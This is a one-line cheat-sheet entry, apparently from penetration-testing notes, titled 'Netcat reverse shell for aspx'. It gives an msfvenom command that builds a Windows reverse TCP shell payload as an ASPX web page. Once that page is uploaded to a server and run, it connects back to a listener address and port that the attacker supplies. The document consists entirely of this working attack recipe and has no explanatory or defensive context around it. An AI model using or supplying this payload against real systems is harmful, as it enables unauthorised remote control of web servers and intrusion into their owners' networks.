
Netcat reverse shell for aspx
```
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx > shell.aspx
```